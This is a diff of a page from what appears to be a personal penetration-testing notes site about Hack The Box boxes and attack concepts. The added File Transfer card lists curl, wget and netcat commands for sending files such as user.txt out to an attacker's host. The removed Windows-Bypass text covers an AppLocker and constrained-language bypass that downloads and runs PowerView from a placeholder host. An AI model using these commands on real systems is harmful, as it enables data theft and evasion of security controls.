@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-04-18T01:16:24 EDT">
+<meta name="revised" content="2019-04-20T12:45:24 EDT">
 <title>Concept :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -81,6 +81,13 @@
         <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
+<li data-nav-id="/concepts/file-transfer/" class="dd-item">
+    <div>
+        <a href="/concepts/file-transfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
 <li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
         ">
     <div>
@@ -258,6 +265,13 @@
     <div>
 
         <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/teacher/">
+            teacher
+        </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
     </ul>
@@ -459,6 +473,7 @@
           
     <option value="/concepts/"  selected>
    Concept</option> 
+      <option value="/concepts/file-transfer/" >- File Transfer</option>
     <option value="/concepts/webapppentest/" >
   - 
    WebAppPenTests</option>
@@ -504,16 +519,19 @@
 <ul class="children children-card">
 
 <span><card>
+		<a href="/concepts/file-transfer/" >File Transfer</a></card>
+<p>##################Linux########################## 1# Python http server listener = python3 -m http.server 9090 listener = python -m simpleHTTPServer 9090 upload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file Note for wget post method youll need to use netcat instead of python doesn't support post. upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename 2# Netcat notice with this method , sender &lt;, reciever &gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 &lt; file.</p>
+</span>
+
+<span><card>
 		<a href="/concepts/webapppentest/" >WebAppPenTests</a></card>
 <p></p>
 </span>
 
 <span><card>
 		<a href="/concepts/bypass/" >Windows-Bypass</a></card>
-<p>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions.
-If PowerShell version 2 is available you may be able to use this trick.
-PowerShell -Version 2 -ExecutionPolicy ByPass -command &quot;&quot;  to check for constrained language mode.
-$ExecutionContext.SessionState.LanguageMode  $ExecutionContext.SessionState.LanguageMode = &quot;FullLanguage&quot;  ie (New-Object Net.WebClient).DownloadString('http://changeme/powerview.ps1')  [System.Console]::WriteLine(&quot;Hello&quot;)  c:\windows\microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U .\meh.exe  Bypassing anti virus</p>
+<p>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.
+CLM uses umci policy to determine what powershell scripts are approved(whitelisted).</p>
 </span>
 </ul>
 
@@ -529,7 +547,7 @@ $ExecutionContext.SessionState.LanguageMode  $ExecutionContext.SessionState.Lang
         <div class="chevrons">
     <div id="navigation">
 <a class="nav nav-prev" href="/" title=""> <i class="fa fa-chevron-left"></i><label></label></a>
-    <a class="nav nav-next" href="/concepts/webapppentest/" title="WebAppPenTests" style="margin-right: 0px;"><label>WebAppPenTests</label><i class="fa fa-chevron-right"></i></a></div>
+    <a class="nav nav-next" href="/concepts/file-transfer/" title="File Transfer" style="margin-right: 0px;"><label>File Transfer</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
